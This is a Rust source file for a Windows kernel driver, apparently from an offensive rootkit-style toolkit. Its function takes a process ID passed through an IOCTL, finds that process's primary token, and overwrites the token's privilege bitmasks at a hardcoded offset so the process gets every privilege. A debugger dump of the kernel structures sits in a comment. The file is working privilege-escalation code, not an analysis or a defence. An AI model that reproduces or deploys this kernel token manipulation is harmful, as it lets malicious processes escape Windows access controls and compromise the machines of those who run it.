use core::{ptr::{null_mut}};
use common::TargetProcess;
use kernel_print::kernel_println;
use winapi::{km::wdm::{IRP, IO_STACK_LOCATION, PEPROCESS}, shared::{ntstatus::{STATUS_UNSUCCESSFUL, STATUS_SUCCESS}}, um::winnt::PACCESS_TOKEN};
use winapi::shared::ntdef::{NTSTATUS, NT_SUCCESS};
use crate::process::{PsLookupProcessByProcessId, PsReferencePrimaryToken, ObfDereferenceObject, PsDereferencePrimaryToken};

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct ProcessPrivileges {
    pub present: [u8; 8],
    pub enabled: [u8; 8],
    pub enabled_by_default: [u8; 8],
}

/// Enables all token privileges for the targeted process
pub fn enable_all_token_privileges(_irp: &mut IRP, stack: *mut IO_STACK_LOCATION) -> NTSTATUS {

    //let target_process = unsafe { (*irp.AssociatedIrp.SystemBuffer()) as *mut TargetProcess };
    let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };

    let mut e_process: PEPROCESS = null_mut();
    unsafe { kernel_println!("[*] Process ID {:?}", (*target_process).process_id) };

    let status = unsafe { PsLookupProcessByProcessId((*target_process).process_id as *mut _, &mut e_process) };

    if !NT_SUCCESS(status) {
        kernel_println!("[-] PsLookupProcessByProcessId failed in token function");
        return STATUS_UNSUCCESSFUL;
    }

    let ptr_token: PACCESS_TOKEN  = unsafe { PsReferencePrimaryToken(e_process) };

    if ptr_token.is_null() {
        kernel_println!("[-] PsReferencePrimaryToken failed in token function");
        return STATUS_UNSUCCESSFUL;
    }

    //The Privileges offset has not changed change since vista so we can hardcode here.
    let ptr_process_privileges = unsafe { ptr_token.cast::<u8>().offset(0x40) as *mut ProcessPrivileges};

    if ptr_process_privileges.is_null() {
        kernel_println!("[-] ptr_process_privileges is NULL");
        return STATUS_UNSUCCESSFUL;
    }

    kernel_println!("[+] Enabling all process privileges {:?}", ptr_process_privileges);
    
    unsafe { 
        (*ptr_process_privileges).enabled[0] = 0xff;
        (*ptr_process_privileges).present[0] = (*ptr_process_privileges).enabled[0];

        (*ptr_process_privileges).enabled[1] = 0xff;
        (*ptr_process_privileges).present[1] = (*ptr_process_privileges).enabled[1];

        (*ptr_process_privileges).enabled[2] = 0xff;
        (*ptr_process_privileges).present[2] = (*ptr_process_privileges).enabled[2];

        (*ptr_process_privileges).enabled[3] = 0xff;
        (*ptr_process_privileges).present[3] = (*ptr_process_privileges).enabled[3];

        (*ptr_process_privileges).enabled[4] = 0xff;
        (*ptr_process_privileges).present[4] = (*ptr_process_privileges).enabled[4];
    };

    unsafe { PsDereferencePrimaryToken(ptr_token) };
    unsafe { ObfDereferenceObject(e_process); }

    return STATUS_SUCCESS;
}

/*
0: kd> dt nt!_EPROCESS
    <...Omitted...>
    +0x4b8 Token            : _EX_FAST_REF
    <...Omitted...>

0: kd> dt nt!_TOKEN
    <...Omitted...>
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
    <...Omitted...>

0: kd> dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B
*/